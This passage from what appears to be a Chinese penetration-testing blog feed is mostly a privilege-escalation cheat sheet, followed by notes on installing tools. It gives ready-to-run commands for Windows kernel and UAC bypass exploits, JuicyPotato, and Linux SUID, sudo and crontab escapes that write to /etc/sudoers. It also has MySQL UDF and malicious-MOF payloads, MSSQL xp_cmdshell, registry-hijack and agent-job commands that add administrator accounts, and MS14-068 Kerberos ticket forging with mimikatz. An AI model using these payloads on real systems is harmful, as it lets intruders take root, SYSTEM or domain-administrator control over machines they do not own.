<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">+ acccess数据库</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>mdb格式直接下载</p>
<pre><code></code></pre>
]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>基础web漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>提权</title>
    <url>/2022/01/16/%E6%8F%90%E6%9D%83/</url>
    <content><![CDATA[<p>[toc]</p>
<h1 id="windows-提权"><a href="#windows-提权" class="headerlink" title="windows 提权"></a>windows 提权</h1><hr>
<h3 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h3><p>汇总：<a href="https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</a></p>
<h5 id="提权辅助"><a href="#提权辅助" class="headerlink" title="提权辅助"></a>提权辅助</h5><p>systeminfo   查看补丁</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Wmic qfe get Caption,Description,HotFixID,InstalledOn</span><br></pre></td></tr></table></figure>

<p><img src="/2022/01/16/%E6%8F%90%E6%9D%83/image-20220221104049104.png" alt="image-20220221104049104"></p>
<p><a href="https://i.hacking8.com/tiquan">https://i.hacking8.com/tiquan</a> 寻找提权漏洞，github下载，但提权exe需要经过免杀测试 </p>
<p><a href="https://github.com/Ascotbe/Kernelhub">Windows提权漏洞合集</a></p>
<a id="more"></a>

<h5 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h5><ol>
<li>该模块能够查询安装补丁</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use post&#x2F;windows&#x2F;gather&#x2F;enum_patches</span><br></pre></td></tr></table></figure>

<p><img src="/2022/01/16/%E6%8F%90%E6%9D%83/image-20220221103405151.png" alt="image-20220221103405151"></p>
<ol start="2">
<li>低权限用户的session，该模块用于快速识别系统中可能被利用的漏洞，进行提权</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use post&#x2F;multi&#x2F;recon&#x2F;local_exploit_suggester </span><br></pre></td></tr></table></figure>

<p><img src="/2022/01/16/%E6%8F%90%E6%9D%83/image-20220221112230097.png" alt="image-20220221112230097"></p>
<p>根据显示可利用的模块，进行提权（感觉可以）</p>
<p><img src="/2022/01/16/%E6%8F%90%E6%9D%83/image-20220221131823569.png" alt="image-20220221131823569"></p>
<h3 id="bypassUAC"><a href="#bypassUAC" class="headerlink" title="bypassUAC"></a>bypassUAC</h3><p>用户帐户控制 (UAC)  允许所有用户使用标准用户帐户登录到他们的计算机。 使用标准用户令牌启动的进程可能会使用授予标准用户的访问权限执行任务。借助 UAC，应用和任务将始终在非管理员帐户的安全上下文中运行，除非管理员专门授予管理员级别的访问系统权限。 UAC 可阻止自动安装未经授权的应用并防止意外更改系统设置。</p>
<p>总之来说就是绕过uac限制，运行某些程序，对c盘一些重要文件进行读取和写入，安装卸载程序等</p>
<p>适用于：</p>
<ul>
<li>Windows 10，Windows 11，Windows Server 2016 和更高版本</li>
</ul>
<h5 id="msf-1"><a href="#msf-1" class="headerlink" title="msf:"></a>msf:</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac</span><br></pre></td></tr></table></figure>

<p><img src="/2022/01/16/%E6%8F%90%E6%9D%83/image-20220221133213351.png" alt="image-20220221133213351"></p>
<p>参考：<a href="https://mp.weixin.qq.com/s/vowFqYxX_x0gu2-38TEGFA">https://mp.weixin.qq.com/s/vowFqYxX_x0gu2-38TEGFA</a></p>
<h5 id="dll注入"><a href="#dll注入" class="headerlink" title="dll注入"></a>dll注入</h5><h5 id="白名单进程"><a href="#白名单进程" class="headerlink" title="白名单进程"></a>白名单进程</h5><h3 id="土豆家族"><a href="#土豆家族" class="headerlink" title="土豆家族"></a>土豆家族</h3><p>Juicy Potato：<a href="https://github.com/ohpe/juicy-potato">https://github.com/ohpe/juicy-potato</a></p>
<p>原理：</p>
<p>实际上就是利用MS16-075漏洞进行提权</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">JuicyPotato.exe -t t -p c:\windows\system32\cmd.exe -l 1111 -c &#123;8BC3F05E-D86B-11D0-A075-00C04FB68820&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/01/16/%E6%8F%90%E6%9D%83/image-20220219151053814.png" alt="image-20220219151053814"></p>
<p>条件：</p>
<ol>
<li>用户权限：</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">如果开启SeImpersonate权限，juicypotato的参数可以使用-t t</span><br><span class="line"></span><br><span class="line">如果开启SeAssignPrimaryToken权限，juicypotato的参数可以使用-t u</span><br><span class="line"></span><br><span class="line">如果均开启，可以选择-t *</span><br><span class="line">如果均未开启，那么无法提权</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>RPC 135端口是否开启</li>
</ol>
<h3 id="其他tips："><a href="#其他tips：" class="headerlink" title="其他tips："></a>其他tips：</h3><p>（CVE-2022-29072）7zip漏洞 提权</p>
<p>参考：</p>
<p><a href="https://mp.weixin.qq.com/s/66y_Pg2j9CNfxeErFczdSg">https://mp.weixin.qq.com/s/66y_Pg2j9CNfxeErFczdSg</a></p>
<p><a href="https://mp.weixin.qq.com/s/lmfM6VWM3YXj2vjalNerKw">https://mp.weixin.qq.com/s/lmfM6VWM3YXj2vjalNerKw</a></p>
<p><a href="https://blog.cfyqy.com/article/bde10ad7.html#more">https://blog.cfyqy.com/article/bde10ad7.html#more</a></p>
<h1 id="linux-提权"><a href="#linux-提权" class="headerlink" title="linux 提权"></a>linux 提权</h1><hr>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname -a               查询内核版本</span><br><span class="line">cat &#x2F;etc&#x2F;issue         查询发行版本</span><br></pre></td></tr></table></figure>



<h3 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h3><p>脏牛</p>
<p>Linux Polkit 权限提升(CVE-2021-4034)</p>
<p>Linux kernel 本地提权漏洞 cve-2022-0847</p>
<p><a href="https://github.com/SecWiki/linux-kernel-exploits">https://github.com/SecWiki/linux-kernel-exploits</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">searchsploit Ubuntu 16.04.1</span><br></pre></td></tr></table></figure>

<p><img src="/2022/01/16/%E6%8F%90%E6%9D%83/image-20220307133812910.png" alt="image-20220307133812910"></p>
<h3 id="SUID"><a href="#SUID" class="headerlink" title="SUID"></a>SUID</h3><p>寻找root用户拥有的suid的文件。普通用户通过suid能够以文件拥有者身份允许该文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#以下命令将尝试查找具有root权限的SUID的文件，不同系统适用于不同的命令，一个一个试</span><br><span class="line">find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line">find &#x2F; -user root -perm -4000-print2&gt;&#x2F;dev&#x2F;null</span><br><span class="line">find &#x2F; -user root -perm -4000-exec ls -ldb &#123;&#125; \;</span><br><span class="line">参考谢公子  https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_36119192&#x2F;article&#x2F;details&#x2F;84872644</span><br></pre></td></tr></table></figure>

<p>可以利用提权的文件列表</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap</span><br><span class="line">vim</span><br><span class="line">find</span><br><span class="line">bash</span><br><span class="line">more</span><br><span class="line">less</span><br><span class="line">nano</span><br><span class="line">cp</span><br></pre></td></tr></table></figure>

<p>如果执行命令发现以上程序文件列表，即可提权，例如：发现 /usr/bin/find</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">touch aaa</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;find  aaa   -exec whoami \;</span><br></pre></td></tr></table></figure>

<p>vim</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim.tiny</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">:set shell&#x3D;&#x2F;bin&#x2F;sh</span><br><span class="line">:shell</span><br></pre></td></tr></table></figure>

<p>bash</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -p</span><br></pre></td></tr></table></figure>

<p>less</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">less &#x2F;etc&#x2F;passwd</span><br><span class="line">!&#x2F;bin&#x2F;sh</span><br></pre></td></tr></table></figure>

<p>awk</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo awk &#39;BEGIN &#123;system(&quot;&#x2F;bin&#x2F;bash&quot;)&#125;&#39;</span><br></pre></td></tr></table></figure>



<h3 id="sudo"><a href="#sudo" class="headerlink" title="sudo"></a>sudo</h3><p>知道账户密码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo find . -exec &#x2F;bin&#x2F;sh \; -quit</span><br><span class="line"></span><br><span class="line">sudo python -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure>



<p>漏洞</p>
<h3 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h3><p>crontab提权</p>
<ol>
<li>编辑/etc/crontab，设置每隔1分钟执行一次sh脚本</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">*&#x2F;1 * * * * root sh &#x2F;home&#x2F;test&#x2F;test.sh &gt;&gt; &#x2F;tmp&#x2F;test.txt</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>如果test用户有权限操作test.sh，则存在提权漏洞。下面使用test用户修改test.sh：将test用户加入sudoers</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mv test.sh test.sh.bak</span><br><span class="line"></span><br><span class="line">vim test.sh                                                               echo &quot;test ALL&#x3D;(root) NOPASSWD: ALL&quot; &gt;&gt; &#x2F;etc&#x2F;sudoers</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ol start="3">
<li>等待1分钟后，成功提权</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo su</span><br><span class="line"></span><br><span class="line">whoami</span><br></pre></td></tr></table></figure>



<p>参考：<a href="https://www.cnblogs.com/sfsec/p/15163907.html">https://www.cnblogs.com/sfsec/p/15163907.html</a></p>
<h1 id="mysql提权"><a href="#mysql提权" class="headerlink" title="mysql提权"></a>mysql提权</h1><h3 id="udf"><a href="#udf" class="headerlink" title="udf"></a>udf</h3><p>原理：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">UDF是mysql的一个扩展接口，即扩展mysql的用户自定义函数。用户可以向mysql的udf.dll中添加用户自定义函数（可以执行命令的函数，如sys_eval（）），即可获得system权限。</span><br></pre></td></tr></table></figure>



<p>条件：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. mysql用户(root)的密码，（查询，破解hash）</span><br><span class="line">2. secure_file_priv的值为空，具有写入权限，</span><br><span class="line">如果mysql服务器开启了secure-file-priv选项，就只能将文件导出到指定目录下</span><br><span class="line"></span><br><span class="line">dll位置：</span><br><span class="line">mysql版本&gt;&#x3D;5.1 dll文件导入lib\plugin目录</span><br><span class="line">5.0&lt;mysql版本&lt;5.1 dll文件导入c:\windows或者c:\windows\system32目录下</span><br><span class="line"></span><br><span class="line">mysql版本&lt;4.1  任意位置</span><br><span class="line">4.1&lt;&#x3D;mysql版本&lt;5.0</span><br></pre></td></tr></table></figure>




<p>查看mysql的版本</p>
<p><img src="/2022/01/16/%E6%8F%90%E6%9D%83/57.png"></p>
<p>查看<code>secure_file_priv</code>的值</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">show global variables like &#39;secure%&#39;;</span><br><span class="line"></span><br><span class="line">当 secure_file_priv 的值为 null ，表示限制 mysqld 不允许导入|导出，此时无法提权</span><br><span class="line"></span><br><span class="line">当 secure_file_priv 的值为 &#x2F;tmp&#x2F; ，表示限制 mysqld 的导入|导出只能发生在 &#x2F;tmp&#x2F; 目录下，此时也无法提权</span><br><span class="line"></span><br><span class="line">当 secure_file_priv 的值没有具体值时，表示不对 mysqld 的导入|导出做限制，此时可提权</span><br></pre></td></tr></table></figure>

<p><img src="/2022/01/16/%E6%8F%90%E6%9D%83/58.png"></p>
<p>此处<code>secure_file_priv</code>的值为空，符合提权的要求</p>
<p>查看<code>plugin</code>的目录名称</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">show variables like &#39;plugin%&#39;;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/01/16/%E6%8F%90%E6%9D%83/59.png"></p>
<p>查询目录的绝对路径</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select @@plugin_dir;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/01/16/%E6%8F%90%E6%9D%83/60.png"></p>
<p>查看系统架构</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">show variables like &#39;%compile%&#39;;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/01/16/%E6%8F%90%E6%9D%83/61.png"></p>
<p>可以看到该主机是64位的</p>
<p>接下来将udf.dll文件写入plugin目录，并创建函数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select 0x十六进制内容 into dumpfile &quot;plugin的目录\\udf.dll&quot;</span><br></pre></td></tr></table></figure>

<p>把桌面上的tools文件夹中的udf.txt里面的十六进制内容写入<code>C:\Program Files\MySQL\MySQL Server 5.5\lib\plugin\udf.dll</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select 0x4D5A90000300000 ...... into dumpfile &#39;C:\\Program Files\\MySQL\\MySQL Server 5.5\\lib\\plugin\\udf.dll&#39;;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/01/16/%E6%8F%90%E6%9D%83/62.png"></p>
<p><img src="/2022/01/16/%E6%8F%90%E6%9D%83/63.png"></p>
<p>成功将udf.dll写入目标路径</p>
<p>导入udf函数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">create function sys_eval returns string soname &#39;udf.dll&#39;;    # 导入sys_eval函数</span><br><span class="line"></span><br><span class="line">select * from mysql.func where name &#x3D; &#39;sys_eval&#39;;   # 查看创建的sys_eval函数</span><br></pre></td></tr></table></figure>

<p><img src="/2022/01/16/%E6%8F%90%E6%9D%83/64.png"></p>
<p>执行系统命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select sys_eval(&#39;whoami&#39;);</span><br><span class="line"></span><br><span class="line">select sys_eval(&#39;ipconfig&#39;);</span><br></pre></td></tr></table></figure>

<p><img src="/2022/01/16/%E6%8F%90%E6%9D%83/65.png"></p>
<p>成功获取system权限</p>
<h3 id="mof"><a href="#mof" class="headerlink" title="mof"></a>mof</h3><p>原理：</p>
<p>对c:/windows/system32/wbem/mof/ 目录下的 nullevt.mof 文件  具有读写权限，在nullevt.mof  中可以构造恶意vbs脚本（特性是每隔一段时间执行一次）进行命令执行 </p>
<p>条件：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">secure-file-priv参数不为null</span><br><span class="line">mysql启动身份具有权限去读写 c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof目录</span><br><span class="line">windows 03及以下版本</span><br></pre></td></tr></table></figure>



<p>公开nullevt.mof 代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#pragma namespace(&quot;\\\\.\\root\\subscription&quot;)</span><br><span class="line">instance of __EventFilter as $EventFilter</span><br><span class="line">&#123;</span><br><span class="line">EventNamespace &#x3D; &quot;Root\\Cimv2&quot;;</span><br><span class="line">Name &#x3D; &quot;filtP2&quot;;</span><br><span class="line">Query &#x3D; &quot;Select * From __InstanceModificationEvent &quot;</span><br><span class="line">&quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot;</span><br><span class="line">&quot;And TargetInstance.Second &#x3D; 5&quot;;</span><br><span class="line">QueryLanguage &#x3D; &quot;WQL&quot;;</span><br><span class="line">&#125;;</span><br><span class="line">instance of ActiveScriptEventConsumer as $Consumer</span><br><span class="line">&#123;</span><br><span class="line">Name &#x3D; &quot;consPCSV2&quot;;</span><br><span class="line">ScriptingEngine &#x3D; &quot;JScript&quot;;</span><br><span class="line">ScriptText &#x3D;</span><br><span class="line">&quot;var WSH &#x3D; new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe user shmily 123456 &#x2F;add\&quot;)&quot;;</span><br><span class="line">&#125;;</span><br><span class="line">instance of __FilterToConsumerBinding</span><br><span class="line">&#123;</span><br><span class="line">Consumer &#x3D; $Consumer;</span><br><span class="line">Filter &#x3D; $EventFilter;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<p>导入：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select load_file(&quot;C:&#x2F;phpStudy&#x2F;WWW&#x2F;upload&#x2F;1.mof&quot;) into dumpfile &quot;c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;nullevt.mof&quot;</span><br></pre></td></tr></table></figure>



<h1 id="mssql提权"><a href="#mssql提权" class="headerlink" title="mssql提权"></a>mssql提权</h1><h3 id="xp-cmdshell"><a href="#xp-cmdshell" class="headerlink" title="xp_cmdshell"></a>xp_cmdshell</h3><p><code>xp_cmdshell</code>在<code>mssql2000</code>中是默认开启的，不过在<code>mssql2005</code>之后的版本中则是默认关闭的。</p>
<p>查询xp_cmdshell是否存在</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select count(*)from master.dbo.sysobjects where xtype &#x3D; &#39;x&#39; and name &#x3D; &#39;xp_cmdshell&#39; ;</span><br></pre></td></tr></table></figure>



<p>启用<code>xp_cmdshell</code>命令  ，需要管理员SA权限，否在不能启动。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">EXEC sp_configure &#39;show advanced options&#39;,1</span><br><span class="line">reconfigure</span><br><span class="line">go</span><br><span class="line">EXEC sp_configure &#39;xp_cmdshell&#39;,1</span><br><span class="line">reconfigure</span><br><span class="line">go</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>提权</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">exec master..xp_cmdshell &#39;net user shmily 123. &#x2F;add&#39;</span><br></pre></td></tr></table></figure>



<h3 id="sp-oacreate"><a href="#sp-oacreate" class="headerlink" title="sp_oacreate"></a>sp_oacreate</h3><p>xp_cmdshell被删除时候，sp_oacreate默认被禁止，需要开启。<code>sp_oacreate</code>在 <code>SQL Server</code>实例上创建<code>OLE</code>对象实例。</p>
<p>恢复sp_oacreate</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">EXEC sp_configure &#39;show advanced options&#39;, 1;   </span><br><span class="line">RECONFIGURE WITH OVERRIDE;   </span><br><span class="line">EXEC sp_configure &#39;Ole Automation Procedures&#39;, 1;   </span><br><span class="line">RECONFIGURE WITH OVERRIDE;  </span><br></pre></td></tr></table></figure>

<p>命令执行   -&gt;输出到c:\1.txt</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">declare @shell int exec sp_oacreate &#39;wscript.shell&#39;,@shell output exec sp_oamethod @shell,&#39;run&#39;,null,&#39;c:\windows\system32\cmd.exe &#x2F;c whoami &gt;c:\\1.txt&#39;;</span><br></pre></td></tr></table></figure>



<h3 id="沙盒提权"><a href="#沙盒提权" class="headerlink" title="沙盒提权"></a>沙盒提权</h3><p>沙盒模式是数据库的一种安全功能.在沙盒模式下,只对控件和字段属性中的安全且不含恶意代码的表达式求值.如果表达式不使用可能以某种方式损坏数据的函数或属性，则可认为它是安全的.</p>
<p><a href="http://alexsel.com/index.php/archives/80/">Mssql提权 - Cyberpunk (alexsel.com)</a></p>
<h3 id="镜像劫持提权"><a href="#镜像劫持提权" class="headerlink" title="镜像劫持提权"></a>镜像劫持提权</h3><p>通过regwrite函数修改注册表进行，regwrite需要开启</p>
<p>参考上面开启Ad Hoc Distributed，并恢复regwrite</p>
<p>劫持</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">EXEC master..xp_regwrite @rootkey&#x3D;&#39;HKEY_LOCAL_MACHINE&#39;,@key&#x3D;&#39;SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.EXE&#39;,@value_name&#x3D;&#39;Debugger&#39;,@type&#x3D;&#39;REG_SZ&#39;,@value&#x3D;&#39;c:\windows\system32\cmd.exe&#39;</span><br></pre></td></tr></table></figure>

<p>查看Debugger 是否为cmd路径</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">exec master..xp_regread &#39;HKEY_LOCAL_MACHINE&#39;,&#39;SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&#39;,&#39;Debugger&#39;</span><br></pre></td></tr></table></figure>

<p>然后远程桌面，五次shift</p>
<h3 id="JOB提权"><a href="#JOB提权" class="headerlink" title="JOB提权"></a>JOB提权</h3><p>创建任务X，执行命令，返回结果</p>
<p>启动sqlagent服务：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">exec master.dbo.xp_servicecontrol &#39;start&#39;,&#39;SQLSERVERAGENT&#39;</span><br></pre></td></tr></table></figure>



<p>创建任务x，执行添加账户的命令，然后将命令返回结果输出到<code>q.txt</code>中</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use msdb</span><br><span class="line">exec sp_delete_job null,&#39;x&#39;</span><br><span class="line">exec sp_add_job &#39;x&#39;</span><br><span class="line">exec sp_add_jobstep null,&#39;x&#39;,null,&#39;1&#39;,&#39;cmdexec&#39;,&#39;cmd &#x2F;c &quot;net user test test &#x2F;add &amp;net localgroup administrators test &#x2F;add&gt;c:&#x2F;q.txt&quot;&#39;</span><br><span class="line">exec sp_add_jobserver null,&#39;x&#39;,@@servername</span><br><span class="line">exec sp_start_job &#39;x&#39;;</span><br></pre></td></tr></table></figure>



<p>参考：</p>
<p><a href="http://alexsel.com/index.php/archives/80/">Mssql提权 - Cyberpunk (alexsel.com)</a></p>
<h1 id="域内提权"><a href="#域内提权" class="headerlink" title="域内提权"></a>域内提权</h1><h3 id="MS14-068"><a href="#MS14-068" class="headerlink" title="MS14-068"></a>MS14-068</h3><p>原理：PAC问题</p>
<p>用户在向 Kerberos 密钥分发中心（KDC）申请TGT（由票据授权服务产生的身份凭证）时，可以伪造自己的 Kerberos 票据。</p>
<p>如果票据声明自己有域管理员权限，而KDC在处理该票据时未验证票据的签名，那么，返给用户的TGT就使普通域用户拥有了域管理员权限。</p>
<p>将TGT发送到KDC，KDC的TGS（票据授权服务）在验证了TGT后，将服务票据（Server Ticket）发送给该用户，而该用户拥有访问该服务的权限，从而使攻击者可以访问域内的资源。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">前提条件：</span><br><span class="line"></span><br><span class="line">域控没有打该漏洞补丁(KB3011780)</span><br><span class="line"></span><br><span class="line">已经获取普通域用户的账户，密码，hash，sid（whoami &#x2F;user）</span><br></pre></td></tr></table></figure>



<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">利用：</span><br><span class="line"></span><br><span class="line">1.mimikatz清除票据</span><br><span class="line">kerberos::purge</span><br><span class="line"></span><br><span class="line">2.ms14-068.exe生成票据</span><br><span class="line">MS14-068.exe -u &lt;userName&gt;@&lt;domainName&gt; -p &lt;clearPassword&gt; -s &lt;userSid&gt; -d &lt;domainControlerAddr(ip)&gt;</span><br><span class="line"></span><br><span class="line">-u   域用户@域控名  -p 域用户密码 -s 域用户sid -d 域ip</span><br><span class="line"></span><br><span class="line">3.mumukatz导入票据，权限提升为域管</span><br><span class="line">kerberos::ptc &quot;票据文件名&quot;</span><br></pre></td></tr></table></figure>



<h3 id="CVE-2021-42287-CVE-2021-42278"><a href="#CVE-2021-42287-CVE-2021-42278" class="headerlink" title="CVE-2021-42287/CVE-2021-42278"></a>CVE-2021-42287/CVE-2021-42278</h3><p>即saMAccountName spoofing漏洞，仅有一个普通域账号的场景下，利用该漏洞接管全域。</p>
<p><a href="https://www.freebuf.com/vuls/317773.html">域内提权漏洞CVE-2021-42287与CVE-2021-42278原理分析 - FreeBuf网络安全行业门户</a></p>
]]></content>
      <categories>
        <category>提权</category>
      </categories>
      <tags>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title>工具安装记录</title>
    <url>/2021/12/29/%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<p>[TOC]</p>
<a id="more"></a>

<h3 id="资产灯塔系统ARL安装使用"><a href="#资产灯塔系统ARL安装使用" class="headerlink" title="资产灯塔系统ARL安装使用"></a><a href="https://www.cnblogs.com/qtzd/p/install-ARL.html">资产灯塔系统ARL安装使用</a></h3><p>官方连接<a href="https://github.com/TophantTechnology/ARL">https://github.com/TophantTechnology/ARL</a></p>
<p>安装过程<a href="https://www.cnblogs.com/qtzd/p/14678853.html">https://www.cnblogs.com/qtzd/p/14678853.html</a></p>
<p>使用教程<a href="https://www.bilibili.com/video/BV1ba41167FR?p=23">https://www.bilibili.com/video/BV1ba41167FR?p=23</a></p>
<blockquote>
<p>使用流程</p>
</blockquote>
<ol>
<li>添加资产分组</li>
<li>添加策略（有很多功能）</li>
<li>添加监控任务（这时候可以选择策略）</li>
</ol>
<blockquote>
<p>升级</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;..&#x2F;..&#x2F;arl</span><br><span class="line"></span><br><span class="line">git pull </span><br><span class="line"></span><br><span class="line">cd &#x2F;..&#x2F;..&#x2F;arl&#x2F;docker</span><br><span class="line"></span><br><span class="line">docker-compose pull</span><br><span class="line"></span><br><span class="line">docker-compose up -d </span><br></pre></td></tr></table></figure>





<blockquote>
<p>忘记密码</p>
</blockquote>
<p>进入数据库</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker exec -it arl_mongodb mongo -u admin -p admin</span><br></pre></td></tr></table></figure>

<p>下面执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; use arl</span><br><span class="line">switched to db arl</span><br><span class="line">&gt; db.user.drop()</span><br><span class="line">true</span><br><span class="line">&gt; db.user.insert(&#123;username: &#39;admin&#39;, password: hex_md5(&#39;arlsalt!@#&#39;+&#39;admin123&#39;)&#125;)</span><br><span class="line">WriteResult(&#123; &quot;nInserted&quot; : 1 &#125;)</span><br><span class="line">&gt; exit</span><br><span class="line">bye</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">用admin&#x2F;admin123登陆</span><br></pre></td></tr></table></figure>





<h3 id="freenom-cloudflare"><a href="#freenom-cloudflare" class="headerlink" title="freenom+cloudflare"></a>freenom+cloudflare</h3><p>freenom:<a href="https://www.freenom.com/zh/index.html?lang=zh">https://www.freenom.com/zh/index.html?lang=zh</a></p>
<p><img src="/2021/12/29/%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/image-20220127170459840.png" alt="image-20220127170459840"></p>
<p>cloudflare:<a href="https://dash.cloudflare.com/">https://dash.cloudflare.com/</a></p>
<p><img src="/2021/12/29/%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/image-20220127170605260.png" alt="image-20220127170605260"></p>
<p><img src="/2021/12/29/%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/image-20220127170626202.png" alt="image-20220127170626202"></p>
<p><img src="/2021/12/29/%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/image-20220127171635729.png" alt="image-20220127171635729"></p>
<h3 id="Impacket"><a href="#Impacket" class="headerlink" title="[Impacket ]"></a>[Impacket ]</h3><p>介绍：<a href="https://www.cnblogs.com/backlion/p/10676339.html">https://www.cnblogs.com/backlion/p/10676339.html</a></p>
<p>安装方法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;CoreSecurity&#x2F;impacket.git</span><br><span class="line"></span><br><span class="line">cd impacket&#x2F;</span><br><span class="line"></span><br><span class="line">python setup.py install</span><br><span class="line"></span><br><span class="line">cd impacket&#x2F;examples</span><br><span class="line">工具都在这个目录里impacket&#x2F;examples</span><br></pre></td></tr></table></figure>

<p>打内网里面很多py还是很方便的</p>
<h3 id="验证码"><a href="#验证码" class="headerlink" title="验证码"></a>验证码</h3><ul>
<li>存在验证码环境下爆破</li>
</ul>
<p><a href="https://github.com/c0ny1/captcha-killer">c0ny1/验证码杀手： 打嗝验证码识别接口调用插件 (github.com)</a></p>
<p><a href="https://github.com/smxiazi/NEW_xp_CAPTCHA">smxiazi/NEW_xp_CAPTCHA： xp_CAPTCHA（瞎跑 白嫖版） burp 验证码 识别 burp插件 (github.com)</a></p>
<p>两者配合</p>
<p>参考：<a href="https://mp.weixin.qq.com/s/ueD26pTySfaCYN3WJCmhNw">https://mp.weixin.qq.com/s/ueD26pTySfaCYN3WJCmhNw</a></p>
<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><h3 id="vscodo-go-debug环境-失败"><a href="#vscodo-go-debug环境-失败" class="headerlink" title="vscodo go debug环境 失败"></a>vscodo go debug环境 失败</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">go env -w GO111MODULE&#x3D;auto</span><br></pre></td></tr></table></figure>

<p><a href="https://blog.csdn.net/qq_43573718/article/details/119488777">(26条消息) VSCode安装go插件失败_编程猿哥的博客-CSDN博客</a></p>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>工具安装记录</tag>
